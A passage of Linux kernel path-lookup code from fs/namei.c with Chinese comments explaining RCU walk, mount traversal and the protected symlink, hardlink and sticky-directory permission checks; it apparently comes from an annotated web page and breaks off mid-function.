filename *name, const struct path *root)&#123; __set_nameidata(p, dfd, name); p-&gt;state = 0; // 如果 root 不为 NULL，则将 state 设置为 ND_ROOT_PRESET，同时设置 root 路径 if (unlikely(root)) &#123; p-&gt;state = ND_ROOT_PRESET; p-&gt;root = *root; &#125;&#125; 123456789101112131415// 恢复 nameidata 结构体static void restore_nameidata(void)&#123; // 获取当前和之前的 nameidata struct nameidata *now = current-&gt;nameidata, *old = now-&gt;saved; // 恢复当前线程的 nameidata current-&gt;nameidata = old; // 如果 old 存在，则更新 total_link_count if (old) old-&gt;total_link_count = now-&gt;total_link_count; // 如果 stack 指向的不是内部数组，则释放内存 if (now-&gt;stack != now-&gt;internal) kfree(now-&gt;stack);&#125; 123456789101112131415// 为 nameidata 结构体分配内存static bool nd_alloc_stack(struct nameidata *nd)&#123; struct saved *p; // 分配内存 p= kmalloc_array(MAXSYMLINKS, sizeof(struct saved), nd-&gt;flags &amp; LOOKUP_RCU ? GFP_ATOMIC : GFP_KERNEL); if (unlikely(!p)) return false; // 复制内部数组到新分配的内存 memcpy(p, nd-&gt;internal, sizeof(nd-&gt;internal)); nd-&gt;stack = p; return true;&#125; 1234567891011121314151617/** * path_connected - 验证 dentry 是否在 mnt.mnt_root 下面 * * 重命名操作有时会将文件或目录移出绑定挂载， * path_connected 允许检测这些情况。 */static bool path_connected(struct vfsmount *mnt, struct dentry *dentry)&#123; struct super_block *sb = mnt-&gt;mnt_sb; // 绑定挂载可以有断开的路径 if (mnt-&gt;mnt_root == sb-&gt;s_root) return true; // 判断 dentry 是否是 mnt.mnt_root 的子目录 return is_subdir(dentry, mnt-&gt;mnt_root);&#125; 123456789101112// 清除链接static void drop_links(struct nameidata *nd)&#123; int i = nd-&gt;depth; while (i--) &#123; struct saved *last = nd-&gt;stack + i; // 执行延迟调用 do_delayed_call(&amp;last-&gt;done); // 清除延迟调用 clear_delayed_call(&amp;last-&gt;done); &#125;&#125; 1234567// 离开 RCU 读取区域static void leave_rcu(struct nameidata *nd)&#123; nd-&gt;flags &amp;= ~LOOKUP_RCU; nd-&gt;seq = nd-&gt;next_seq = 0; rcu_read_unlock();&#125; 1234567891011121314151617181920212223242526// 终止路径解析static void terminate_walk(struct nameidata *nd)&#123; // 清除链接 drop_links(nd); if (!(nd-&gt;flags &amp; LOOKUP_RCU)) &#123; int i; // 释放 path 引用 path_put(&amp;nd-&gt;path); for (i = 0; i &lt; nd-&gt;depth; i++) // 释放 stack 中的所有 link 引用 path_put(&amp;nd-&gt;stack[i].link); if (nd-&gt;state &amp; ND_ROOT_GRABBED) &#123; // 如果 root 被抓取，则释放 root 引用并清除 ND_ROOT_GRABBED 标志 path_put(&amp;nd-&gt;root); nd-&gt;state &amp;= ~ND_ROOT_GRABBED; &#125; &#125; else &#123; // 如果在 RCU 读取区域，则离开 RCU 读取区域 leave_rcu(nd); &#125; // 重置 depth 和 path nd-&gt;depth = 0; nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL;&#125; 1234567891011121314151617181920// 无论成功或失败，之后都需要 path_putstatic bool __legitimize_path(struct path *path, unsigned seq, unsigned mseq)&#123; // 验证mnt结构体是否合法 int res = __legitimize_mnt(path-&gt;mnt, mseq); // 如果不合法，则将mnt和dentry设为NULL并返回false if (unlikely(res)) &#123; if (res &gt; 0) path-&gt;mnt = NULL; path-&gt;dentry = NULL; return false; &#125; // 如果dentry的d_lockref是死的，则将dentry设为NULL并返回false if (unlikely(!lockref_get_not_dead(&amp;path-&gt;dentry-&gt;d_lockref))) &#123; path-&gt;dentry = NULL; return false; &#125; // 如果读取序列号失败，则返回false return !read_seqcount_retry(&amp;path-&gt;dentry-&gt;d_seq, seq);&#125; 123456// 验证路径是否合法static inline bool legitimize_path(struct nameidata *nd, struct path *path, unsigned seq)&#123; return __legitimize_path(path, seq, nd-&gt;m_seq);&#125; 1234567891011121314151617181920212223// 验证链接是否合法static bool legitimize_links(struct nameidata *nd)&#123; int i; // 如果有LOOKUP_CACHED标志，那么清除链接并将depth设为0，然后返回false if (unlikely(nd-&gt;flags &amp; LOOKUP_CACHED)) &#123; drop_links(nd); nd-&gt;depth = 0; return false; &#125; // 遍历stack中的所有元素，验证每个链接是否合法 for (i = 0; i &lt; nd-&gt;depth; i++) &#123; struct saved *last = nd-&gt;stack + i; // 如果链接不合法，那么清除链接并将depth设为i+1，然后返回false if (unlikely(!legitimize_path(nd, &amp;last-&gt;link, last-&gt;seq))) &#123; drop_links(nd); nd-&gt;depth = i + 1; return false; &#125; &#125; // 所有链接都合法，返回true return true;&#125; 1234567891011// 验证root是否合法static bool legitimize_root(struct nameidata *nd)&#123; // 如果nd-&gt;root是0或者被VFS用户管理，那么不需要做任何事情，直接返回true if (!nd-&gt;root.mnt || (nd-&gt;state &amp; ND_ROOT_PRESET)) return true; // 设置ND_ROOT_GRABBED标志 nd-&gt;state |= ND_ROOT_GRABBED; // 验证root路径是否合法 return legitimize_path(nd, &amp;nd-&gt;root, nd-&gt;root_seq);&#125; 12345678910/* * Path walking has 2 modes, rcu-walk and ref-walk (see * Documentation/filesystems/path-lookup.txt). In situations when we can&#x27;t * continue in RCU mode, we attempt to drop out of rcu-walk mode and grab * normal reference counts on dentries and vfsmounts to transition to ref-walk * mode. Refcounts are grabbed at the last known good point before rcu-walk * got stuck, so ref-walk may continue from there. If this is not successful * (eg. a seqcount has changed), then failure is returned and it&#x27;s up to caller * to restart the path walk from the beginning in ref-walk mode. */ 1234567891011121314151617181920212223242526272829303132/** * try_to_unlazy - 尝试切换到引用遍历模式。 * @nd: nameidata路径遍历数据 * 返回: 成功返回true，失败返回false * * try_to_unlazy 尝试将当前的nd-&gt;path和nd-&gt;root合法化为引用遍历模式。 * 必须在rcu-walk上下文中调用。 * 在try_to_unlazy()失败和terminate_walk()之间，不应触及nameidata。 */static bool try_to_unlazy(struct nameidata *nd)&#123; struct dentry *parent = nd-&gt;path.dentry; BUG_ON(!(nd-&gt;flags &amp; LOOKUP_RCU)); if (unlikely(!legitimize_links(nd))) goto out1; if (unlikely(!legitimize_path(nd, &amp;nd-&gt;path, nd-&gt;seq))) goto out; if (unlikely(!legitimize_root(nd))) goto out; leave_rcu(nd); BUG_ON(nd-&gt;inode != parent-&gt;d_inode); return true;out1: nd-&gt;path.mnt = NULL; nd-&gt;path.dentry = NULL;out: leave_rcu(nd); return false;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * try_to_unlazy_next - 尝试切换到引用遍历模式。 * @nd: nameidata路径遍历数据 * @dentry: 需要步入的下一个dentry * 返回: 成功返回true，失败返回false * * 类似于try_to_unlazy()，但在这里我们已经通过rcu-walk选择了下一个dentry， * 并希望除了当前的nd-&gt;path和nd-&gt;root外，还要将其合法化为引用遍历模式。 * 必须在rcu-walk上下文中调用。 * 在try_to_unlazy_next()失败和terminate_walk()之间，不应触及nameidata。 */static bool try_to_unlazy_next(struct nameidata *nd, struct dentry *dentry)&#123; int res; BUG_ON(!(nd-&gt;flags &amp; LOOKUP_RCU)); if (unlikely(!legitimize_links(nd))) goto out2; res = __legitimize_mnt(nd-&gt;path.mnt, nd-&gt;m_seq); if (unlikely(res)) &#123; if (res &gt; 0) goto out2; goto out1; &#125; if (unlikely(!lockref_get_not_dead(&amp;nd-&gt;path.dentry-&gt;d_lockref))) goto out1; /* * 我们需要将父节点和dentry从RCU领域移动到适当的引用计数。 * 并且dentry中的序列号验证了*两个* dentry计数器，因为我们在获取子序列号后检查了父序列号。 * 所以我们知道如果子序列号是有效的，那么父节点必须仍然是有效的。 */ if (unlikely(!lockref_get_not_dead(&amp;dentry-&gt;d_lockref))) goto out; if (read_seqcount_retry(&amp;dentry-&gt;d_seq, nd-&gt;next_seq)) goto out_dput; /* * 序列计数匹配。现在确保root仍然有效，并在需要时获取它。 */ if (unlikely(!legitimize_root(nd))) goto out_dput; leave_rcu(nd); return true;out2: nd-&gt;path.mnt = NULL;out1: nd-&gt;path.dentry = NULL;out: leave_rcu(nd); return false;out_dput: leave_rcu(nd); dput(dentry); return false;&#125; 12345678910// 检查dentry是否需要进一步验证static inline int d_revalidate(struct dentry *dentry, unsigned int flags)&#123; // 如果dentry设置了DCACHE_OP_REVALIDATE标志，则调用d_revalidate进行验证 if (unlikely(dentry-&gt;d_flags &amp; DCACHE_OP_REVALIDATE)) return dentry-&gt;d_op-&gt;d_revalidate(dentry, flags); else // 否则直接返回1表示验证成功 return 1;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * complete_walk - 完成路径遍历 * @nd: nameidata指针 * * 如果我们处于RCU模式，退出它并合法化nd-&gt;path。 * 除非我们在路径遍历过程中已经完成了验证，或者文件系统不需要验证，否则重新验证最后的结果。 * 成功返回0，失败返回-error。在失败的情况下，调用者无需丢弃nd-&gt;path。 */static int complete_walk(struct nameidata *nd)&#123; struct dentry *dentry = nd-&gt;path.dentry; // 获取路径的dentry int status; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果在RCU模式下 /* * 对于scoped-lookups或外部管理的nd-&gt;root，我们不想将nd-&gt;root置为0。 */ if (!(nd-&gt;state &amp; ND_ROOT_PRESET)) // 如果nd-&gt;state没有设置ND_ROOT_PRESET if (!(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) // 如果没有设置LOOKUP_IS_SCOPED nd-&gt;root.mnt = NULL; // 将nd-&gt;root.mnt置为NULL nd-&gt;flags &amp;= ~LOOKUP_CACHED; // 清除LOOKUP_CACHED标志 if (!try_to_unlazy(nd)) // 尝试退出lazy模式 return -ECHILD; // 如果失败，返回-ECHILD &#125; if (unlikely(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) &#123; // 如果设置了LOOKUP_IS_SCOPED /* * 尽管LOOKUP_IS_SCOPED的保证大概是&quot;在查找过程中不要走出root&quot;，这应该已经被namei的其余部分保证了， * 但我们希望避免namei的BUG导致用户空间得到一个在查找过程中某个时点不在root内的路径。 * * 因此，进行最后的健全性检查，确保在最坏的情况下（完全绕过LOOKUP_IS_SCOPED）我们不会无声无息地 * 将一个完全在请求的root外的fd返回给用户空间。 * * 用户空间可能会在这个检查之后将路径移出root，但是如其他地方所讨论的，这不是问题（解析的文件曾经在root内）。 */ if (!path_is_under(&amp;nd-&gt;path, &amp;nd-&gt;root)) // 判断nd-&gt;path是否在nd-&gt;root下 return -EXDEV; // 如果不在，返回-EXDEV &#125; if (likely(!(nd-&gt;state &amp; ND_JUMPED))) // 如果nd-&gt;state没有设置ND_JUMPED return 0; // 返回0 if (likely(!(dentry-&gt;d_flags &amp; DCACHE_OP_WEAK_REVALIDATE))) // 如果dentry的d_flags没有设置DCACHE_OP_WEAK_REVALIDATE return 0; // 返回0 status = dentry-&gt;d_op-&gt;d_weak_revalidate(dentry, nd-&gt;flags); // 执行弱验证 if (status &gt; 0) // 如果验证成功 return 0; // 返回0 if (!status) // 如果验证失败 status = -ESTALE; // 设置status为-ESTALE return status; // 返回status&#125; 12345678910111213141516171819202122232425static int set_root(struct nameidata *nd)&#123; struct fs_struct *fs = current-&gt;fs; // 获取当前的文件系统结构 /* * 在scoped-lookup中跳转到实际的root是namei的BUG，但我们仍然必须确保它不会发生， * 因为它会导致从dirfd中跳出。 */ if (WARN_ON(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) // 如果设置了LOOKUP_IS_SCOPED，发出警告 return -ENOTRECOVERABLE; // 返回-ENOTRECOVERABLE if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果在RCU模式下 unsigned seq; do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); // 读取fs的seq nd-&gt;root = fs-&gt;root; nd-&gt;root_seq = __read_seqcount_begin(&amp;nd-&gt;root.dentry-&gt;d_seq); // 读取nd-&gt;root的dentry的d_seq &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); // 如果fs的seq有变动，重试 &#125; else &#123; get_fs_root(fs, &amp;nd-&gt;root); // 获取fs的root，设置到nd-&gt;root nd-&gt;state |= ND_ROOT_GRABBED; // 设置nd-&gt;state的ND_ROOT_GRABBED &#125; return 0; // 返回0&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344static int nd_jump_root(struct nameidata *nd)&#123; // 如果设置了LOOKUP_BENEATH标志，返回-EXDEV if (unlikely(nd-&gt;flags &amp; LOOKUP_BENEATH)) return -EXDEV; // 如果设置了LOOKUP_NO_XDEV标志 if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) &#123; /* Absolute path arguments to path_init() are allowed. */ // 如果nd-&gt;path.mnt不为空，并且nd-&gt;path.mnt不等于nd-&gt;root.mnt，返回-EXDEV if (nd-&gt;path.mnt != NULL &amp;&amp; nd-&gt;path.mnt != nd-&gt;root.mnt) return -EXDEV; &#125; // 如果nd-&gt;root.mnt为空 if (!nd-&gt;root.mnt) &#123; // 调用set_root设置root，并检查返回值 int error = set_root(nd); if (error) return error; &#125; // 如果设置了LOOKUP_RCU标志 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; struct dentry *d; nd-&gt;path = nd-&gt;root; // 将nd-&gt;root赋值给nd-&gt;path d = nd-&gt;path.dentry; // 获取nd-&gt;path的dentry nd-&gt;inode = d-&gt;d_inode; // 获取dentry的inode赋值给nd-&gt;inode nd-&gt;seq = nd-&gt;root_seq; // 将nd-&gt;root_seq赋值给nd-&gt;seq // 如果d-&gt;d_seq和nd-&gt;seq不匹配，返回-ECHILD if (read_seqcount_retry(&amp;d-&gt;d_seq, nd-&gt;seq)) return -ECHILD; &#125; else &#123; // 如果没有设置LOOKUP_RCU标志 path_put(&amp;nd-&gt;path); // 递减nd-&gt;path的引用计数 nd-&gt;path = nd-&gt;root; // 将nd-&gt;root赋值给nd-&gt;path path_get(&amp;nd-&gt;path); // 递增nd-&gt;path的引用计数 nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 获取nd-&gt;path的dentry的inode赋值给nd-&gt;inode &#125; // 设置ND_JUMPED标志 nd-&gt;state |= ND_JUMPED; return 0; // 返回0&#125; 12345678910111213141516171819202122232425262728293031323334/* * Helper to directly jump to a known parsed path from -&gt;get_link, * caller must have taken a reference to path beforehand. */int nd_jump_link(const struct path *path)&#123; int error = -ELOOP; // 初始化error为-ELOOP struct nameidata *nd = current-&gt;nameidata; // 获取当前的nameidata // 如果设置了LOOKUP_NO_MAGICLINKS标志 if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_MAGICLINKS)) goto err; error = -EXDEV; // 将error设置为-EXDEV // 如果设置了LOOKUP_NO_XDEV标志 if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) &#123; if (nd-&gt;path.mnt != path-&gt;mnt) // 如果nd-&gt;path.mnt不等于path-&gt;mnt goto err; &#125; // 如果设置了LOOKUP_IS_SCOPED标志 if (unlikely(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) goto err; path_put(&amp;nd-&gt;path); // 递减nd-&gt;path的引用计数 nd-&gt;path = *path; // 将*path赋值给nd-&gt;path nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; // 获取nd-&gt;path的dentry的inode赋值给nd-&gt;inode nd-&gt;state |= ND_JUMPED; // 设置ND_JUMPED标志 return 0; // 返回0err: path_put(path); // 递减path的引用计数 return error; // 返回error&#125; 123456789101112static inline void put_link(struct nameidata *nd)&#123; // 获取nd-&gt;stack中的最后一个元素 struct saved *last = nd-&gt;stack + --nd-&gt;depth; // 延迟调用 do_delayed_call(&amp;last-&gt;done); // 如果没设置LOOKUP_RCU标志，则递减last-&gt;link的引用计数 if (!(nd-&gt;flags &amp; LOOKUP_RCU)) path_put(&amp;last-&gt;link);&#125; 12345// 定义四个静态整型变量，用于存储系统配置信息，__read_mostly指示这些数据主要是被读取static int sysctl_protected_symlinks __read_mostly;static int sysctl_protected_hardlinks __read_mostly;static int sysctl_protected_fifos __read_mostly;static int sysctl_protected_regular __read_mostly; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#ifdef CONFIG_SYSCTL// 定义一个包含四个元素的ctl_table数组，// 用于存储四个不同的系统配置项的信息static struct ctl_table namei_sysctls[] = &#123; &#123; // 系统配置项的名称 .procname = &quot;protected_symlinks&quot;, // 指向存储配置项值的变量的指针 .data = &amp;sysctl_protected_symlinks, // 存储配置项值的变量的大小 .maxlen = sizeof(int), // 配置项的权限 .mode = 0644, // 处理配置项值的函数 .proc_handler = proc_dointvec_minmax, // 配置项值的最小值 .extra1 = SYSCTL_ZERO, // 配置项值的最大值 .extra2 = SYSCTL_ONE, &#125;, // 以下三个元素与第一个类似，不再赘述 &#123; .procname = &quot;protected_hardlinks&quot;, .data = &amp;sysctl_protected_hardlinks, .maxlen = sizeof(int), .mode = 0644, .proc_handler = proc_dointvec_minmax, .extra1 = SYSCTL_ZERO, .extra2 = SYSCTL_ONE, &#125;, &#123; .procname = &quot;protected_fifos&quot;, .data = &amp;sysctl_protected_fifos, .maxlen = sizeof(int), .mode = 0644, .proc_handler = proc_dointvec_minmax, .extra1 = SYSCTL_ZERO, .extra2 = SYSCTL_TWO, &#125;, &#123; .procname = &quot;protected_regular&quot;, .data = &amp;sysctl_protected_regular, .maxlen = sizeof(int), .mode = 0644, .proc_handler = proc_dointvec_minmax, .extra1 = SYSCTL_ZERO, .extra2 = SYSCTL_TWO, &#125;, // 结束标志 &#123; &#125;&#125;;// 初始化函数static int __init init_fs_namei_sysctls(void)&#123; // 注册系统配置项 register_sysctl_init(&quot;fs&quot;, namei_sysctls); return 0;&#125;// 将初始化函数添加到fs_initcall列表中，// 这样在系统启动时，init_fs_namei_sysctls会被自动调用fs_initcall(init_fs_namei_sysctls);#endif /* CONFIG_SYSCTL */ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * may_follow_link - 检查符号链接的跟踪是否存在不安全情况 * @nd: nameidata路径遍历数据 * * 在启用sysctl_protected_symlinks系统配置项的情况下， * 如果符号链接位于粘性全局可写目录中，需要特别忽略CAP_DAC_OVERRIDE。 * 这是为了保护特权进程不受路径名可能因其他用户创建恶意符号链接而改变的竞态条件的影响。 * 它将只允许在粘性全局可写目录外部，或者符号链接的uid与跟随者匹配， * 或者目录所有者与符号链接的所有者匹配时跟踪符号链接。 * * 如果允许跟踪符号链接，则返回0，如果出错，则返回-ve。 */static inline int may_follow_link(struct nameidata *nd, const struct inode *inode)&#123; // 声明变量 struct mnt_idmap *idmap; vfsuid_t vfsuid; // 如果未启用sysctl_protected_symlinks系统配置项，返回0 if (!sysctl_protected_symlinks) return 0; // 获取nd-&gt;path.mnt的mnt_idmap idmap = mnt_idmap(nd-&gt;path.mnt); // 将inode的i_uid转换为vfsuid vfsuid = i_uid_into_vfsuid(idmap, inode); // 如果所有者和跟随者匹配，则允许 if (vfsuid_eq_kuid(vfsuid, current_fsuid())) return 0; // 如果父目录不是粘性的和全局可写的，则允许 if ((nd-&gt;dir_mode &amp; (S_ISVTX|S_IWOTH)) != (S_ISVTX|S_IWOTH)) return 0; // 如果父目录和链接所有者匹配，则允许 if (vfsuid_valid(nd-&gt;dir_vfsuid) &amp;&amp; vfsuid_eq(nd-&gt;dir_vfsuid, vfsuid)) return 0; // 如果设置了LOOKUP_RCU标志，返回-ECHILD if (nd-&gt;flags &amp; LOOKUP_RCU) return -ECHILD; // 审计inode audit_inode(nd-&gt;name, nd-&gt;stack[0].link.dentry, 0); // 记录被拒绝的路径 audit_log_path_denied(AUDIT_ANOM_LINK, &quot;follow_link&quot;); // 返回-EACCES return -EACCES;&#125; 1234567891011121314151617181920212223242526272829303132333435363738/** * safe_hardlink_source - 检查安全的硬链接条件 * @idmap: inode所在挂载点的idmap * @inode: 要从中创建硬链接的源inode * * 如果满足以下任一条件，返回false： * - inode不是一个普通文件 * - inode是setuid * - inode是setgid并且是组可执行的 * - 读写访问失败 * * 否则返回true。 */static bool safe_hardlink_source(struct mnt_idmap *idmap, struct inode *inode)&#123; // 获取inode的模式 umode_t mode = inode-&gt;i_mode; // 如果inode不是一个普通文件，返回false if (!S_ISREG(mode)) return false; // 如果inode是setuid，返回false if (mode &amp; S_ISUID) return false; // 如果inode是可执行的setgid文件，返回false if ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) return false; // 如果无法读取或写入源文件，则创建硬链接是危险的，返回false if (inode_permission(idmap, inode, MAY_READ | MAY_WRITE)) return false; // 否则返回true return true;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940/** * may_linkat - 检查创建硬链接的权限 * @idmap: inode 所在挂载点的 idmap * @link: 要从哪里创建硬链接 * * 阻止以下情况的硬链接创建： * - 启用了 sysctl_protected_hardlinks * - fsuid 与 inode 不匹配 * - 硬链接源不安全（参见上述 safe_hardlink_source()） * - 在 inode 所有者 uid 映射的命名空间中，不是 CAP_FOWNER * * 如果通过 idmapped 挂载找到 inode，则必须通过 @idmap 传递 vfsmount 的 idmap。 * 此函数将会根据 @idmap 映射 inode，然后进行权限检查。 * 在非 idmapped 挂载上或者如果要对原始 inode 进行权限检查，只需传递 @nop_mnt_idmap 即可。 * * 如果成功，则返回 0；如果出错，则返回负值。 */int may_linkat(struct mnt_idmap *idmap, const struct path *link)&#123; // 从链接路径中获取 inode struct inode *inode = link-&gt;dentry-&gt;d_inode; // 如果 uid 或 gid 无效，则 inode 写回不安全 if (!vfsuid_valid(i_uid_into_vfsuid(idmap, inode)) || !vfsgid_valid(i_gid_into_vfsgid(idmap, inode))) return -EOVERFLOW; // 如果没有启用 sysctl_protected_hardlinks，则函数可以成功返回 if (!sysctl_protected_hardlinks) return 0; // 如果是安全的硬链接源，或者是源 inode 的所有者（或者是 CAP_FOWNER），则可以成功返回 if (safe_hardlink_source(idmap, inode) || inode_owner_or_capable(idmap, inode)) return 0; // 如果到达这里，说明链接被拒绝，因此记录它并返回权限错误 audit_log_path_denied(AUDIT_ANOM_LINK, &quot;linkat&quot;); return -EPERM;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * may_create_in_sticky - 检查在粘性目录中是否应允许 O_CREAT 打开已存在的文件 * @idmap: inode 所在挂载点的 idmap * @nd: 路径遍历数据 * @inode: 要打开的文件的 inode * * 当以下条件满足时，阻止 O_CREAT 打开 FIFO（或常规文件）： * - 启用了 sysctl_protected_fifos（或 sysctl_protected_regular） * - 文件已经存在 * - 我们在粘性目录内 * - 我们不拥有文件 * - 目录的所有者不拥有文件 * - 目录是全世界可写的 * 如果将 sysctl_protected_fifos（或 sysctl_protected_regular）设置为 2， * 那么目录不必是全世界可写的：只需要是组可写就足够了。 * * 如果通过 idmapped 挂载找到 inode，则必须通过 @idmap 传递 vfsmount 的 idmap。 * 此函数将会根据 @idmap 映射 inode，然后进行权限检查。 * 在非 idmapped 挂载上或者如果要对原始 inode 进行权限检查，只需传递 @nop_mnt_idmap 即可。 * * 如果允许打开，则返回 0；如果出错，则返回负值。 */static int may_create_in_sticky(struct mnt_idmap *idmap, struct nameidata *nd, struct inode *const inode)&#123; // 获取目录模式和 uid umode_t dir_mode = nd-&gt;dir_mode; vfsuid_t dir_vfsuid = nd-&gt;dir_vfsuid; // 如果没有启用 sysctl_protected_fifos，或者没有启用 sysctl_protected_regular，或者目录不是粘性的，或者 inode 的 uid 与目录的 uid 或当前的 fsuid 匹配，则成功返回 if ((!sysctl_protected_fifos &amp;&amp;S_ISFIFO(inode-&gt;i_mode)) || (!sysctl_protected_regular &amp;&amp; S_ISREG(inode-&gt;i_mode)) || likely(!(dir_mode &amp; S_ISVTX)) || vfsuid_eq(i_uid_into_vfsuid(idmap, inode), dir_vfsuid) || vfsuid_eq_kuid(i_uid_into_vfsuid(idmap, inode), current_fsuid())) return 0; // 如果目录是全世界可写的，或者当 sysctl_protected_fifos（或 sysctl_protected_regular）设置为 2 时，目录是组可写的，那么记录并返回权限错误 if (likely(dir_mode &amp; 0002) || (dir_mode &amp; 0020 &amp;&amp; ((sysctl_protected_fifos &gt;= 2 &amp;&amp; S_ISFIFO(inode-&gt;i_mode)) || (sysctl_protected_regular &gt;= 2 &amp;&amp; S_ISREG(inode-&gt;i_mode))))) &#123; const char *operation = S_ISFIFO(inode-&gt;i_mode) ? &quot;sticky_create_fifo&quot; : &quot;sticky_create_regular&quot;; audit_log_path_denied(AUDIT_ANOM_CREAT, operation); return -EACCES; &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * follow_up - 找到路径的 vfsmount 的挂载点 * * 给定一个路径，找到其源文件系统的挂载点。 * 将 @path 替换为父挂载点中的挂载点路径。 * Up 是指向 / 的方向。 * * 如果我们上升了一级，则返回 1；如果我们已经在根目录，则返回 0。 */int follow_up(struct path *path)&#123; // 获取路径的挂载点 struct mount *mnt = real_mount(path-&gt;mnt); struct mount *parent; struct dentry *mountpoint; // 读取挂载锁 read_seqlock_excl(&amp;mount_lock); // 获取父挂载点 parent = mnt-&gt;mnt_parent; // 如果父挂载点就是当前挂载点，表示已经到达根目录，此时释放锁并返回 0 if (parent == mnt) &#123; read_sequnlock_excl(&amp;mount_lock); return 0; &#125; // 不然，增加父挂载点的引用计数 mntget(&amp;parent-&gt;mnt); // 获取挂载点的 dentry mountpoint = dget(mnt-&gt;mnt_mountpoint); // 释放锁 read_sequnlock_excl(&amp;mount_lock); // 释放原来路径的 dentry dput(path-&gt;dentry); // 将路径的 dentry 替换为挂载点的 dentry path-&gt;dentry = mountpoint; // 释放原来路径的挂载点 mntput(path-&gt;mnt); // 将路径的挂载点替换为父挂载点 path-&gt;mnt = &amp;parent-&gt;mnt; // 返回 1，表示我们上升了一级 return 1;&#125;EXPORT_SYMBOL(follow_up); 123456789101112131415161718192021222324252627282930// choose_mountpoint_rcu 函数// 该函数通过 RCU（Read-Copy-Update）机制选择挂载点static bool choose_mountpoint_rcu(struct mount *m, const struct path *root, struct path *path, unsigned *seqp)&#123; // 当挂载点 m 有父挂载点时，执行循环体 while (mnt_has_parent(m)) &#123; // 获取挂载点 m 的挂载点 struct dentry *mountpoint = m-&gt;mnt_mountpoint; // 将 m 更新为其父挂载点 m = m-&gt;mnt_parent; // 如果 root 的 dentry 与 mountpoint 相同，并且 root 的 mnt 与 m 的 mnt 相同，则跳出循环 if (unlikely(root-&gt;dentry == mountpoint &amp;&amp; root-&gt;mnt == &amp;m-&gt;mnt)) break; // 如果 mountpoint 不等于 m 的 mnt_root if (mountpoint != m-&gt;mnt.mnt_root) &#123; // 更新 path 的 mnt 和 dentry path-&gt;mnt = &amp;m-&gt;mnt; path-&gt;dentry = mountpoint; // 读取 mountpoint 的序列号到 seqp *seqp = read_seqcount_begin(&amp;mountpoint-&gt;d_seq); // 返回 true return true; &#125; &#125; // 如果循环结束还没有返回，那么返回 false return false;&#125; 12345678910111213141516171819202122232425262728293031323334353637// choose_mountpoint 函数// 选择挂载点static bool choose_mountpoint(struct mount *m, const struct path *root, struct path *path)&#123; bool found; // 用于存储查找结果 // 获取 RCU 读锁 rcu_read_lock(); // 无限循环，直到满足一定条件跳出 while (1) &#123; unsigned seq, mseq = read_seqbegin(&amp;mount_lock); // 调用 choose_mountpoint_rcu 函数 found = choose_mountpoint_rcu(m, root, path, &amp;seq); // 如果没有找到 if (unlikely(!found)) &#123; // 如果 seq 没有改变，跳出循环 if (!read_seqretry(&amp;mount_lock, mseq)) break; &#125; else &#123; // 如果路径合法，跳出循环 if (likely(__legitimize_path(path, seq, mseq))) break; // 其他情况，释放 RCU 读锁 rcu_read_unlock(); // 释放路径 path_put(path); // 重新获取 RCU 读锁 rcu_read_lock(); &#125; &#125; // 释放 RCU 读锁 rcu_read_unlock(); // 返回查找结果 return found;&#125; 123456789101112131415161718192021222324// follow_automount 函数// 执行自动挂载static int follow_automount(struct path *path, int *count, unsigned lookup_flags)&#123; // 获取路径的 dentry struct dentry *dentry = path-&gt;dentry; // 如果只是进行状态查询，不执行挂载，除非查询的是一个目录并且在名称后面加上了 &#x27;/&#x27; // 如果希望在挂载点下面打开或创建任何类型的文件，或者希望穿越挂载点，或者希望打开已经挂载的目录， // 或者 autofs 将负的 dentry 标记为自动挂载点，那么执行挂载 if (!(lookup_flags &amp; (LOOKUP_PARENT | LOOKUP_DIRECTORY | LOOKUP_OPEN | LOOKUP_CREATE | LOOKUP_AUTOMOUNT)) &amp;&amp; dentry-&gt;d_inode) // 返回 -EISDIR，表示是一个目录 return -EISDIR; // 如果符号链接的数量大于等于 MAXSYMLINKS if (count &amp;&amp; (*count)++ &gt;= MAXSYMLINKS) // 返回 -ELOOP，表示有过多的符号链接 return -ELOOP; // 调用 finish_automount 函数完成自动挂载 return finish_automount(dentry-&gt;d_op-&gt;d_automount(path), path);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// __traverse_mounts 函数// 该函数用于在挂载点之间进行遍历static int __traverse_mounts(struct path *path, unsigned flags, bool *jumped, int *count, unsigned lookup_flags)&#123; struct vfsmount *mnt = path-&gt;mnt; // 获取路径的挂载点 bool need_mntput = false; // 初始化一个标志，表示是否需要释放挂载点 int ret = 0; // 初始化返回值 // 当 dentry 是由文件系统管理的时候，执行循环 while (flags &amp; DCACHE_MANAGED_DENTRY) &#123; // 如果文件系统管理了 transit if (flags &amp; DCACHE_MANAGE_TRANSIT) &#123; // 让文件系统管理 transit ret = path-&gt;dentry-&gt;d_op-&gt;d_manage(path, false); // 获取新的 flags flags = smp_load_acquire(&amp;path-&gt;dentry-&gt;d_flags); // 如果返回值小于0，跳出循环 if (ret &lt; 0) break; &#125; // 如果在 dentry 上挂载了东西 if (flags &amp; DCACHE_MOUNTED) &#123; // 查找挂载点 struct vfsmount *mounted = lookup_mnt(path); // 如果在我们的命名空间中找到了挂载点 if (mounted) 